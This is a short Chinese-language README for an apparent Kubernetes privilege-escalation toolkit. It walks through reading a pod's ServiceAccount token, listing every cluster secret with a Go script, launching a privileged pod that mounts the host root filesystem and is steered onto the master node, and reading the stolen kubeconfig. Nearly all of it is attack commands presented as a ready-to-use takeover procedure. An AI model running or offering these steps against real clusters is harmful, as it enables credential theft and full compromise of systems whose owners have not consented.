### README

1. 获取过度权限ServiceAccount token：

```bash
# 如果你在pod里
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# 如果你在节点上
kubectl describe secret <serviceaccount-token> # 将 <serviceaccount-token> 替换为具有过度权限的 ServiceAccount 的 Token 名称
```

2. 结合list secrets 和 create pods权限接管集群例子

你需要先在go代码中补充你想要使用的token和host等信息

```bash
# 获取整个集群secrets，得到具有create pods权限的token
go run listSecret.go
# 使用此token创建挂载根目录的特权容器，并设置污点容忍将它排斥到master节点上，泄漏kubeconfig配置文件
go run createPod.go
# 进入到此特权容器
kubectl exec -it nginx-pod-mount2 -n default -- bash
# 查看泄露的kubeconfig文件
cat /host/home/ubunt/.kube/config
```

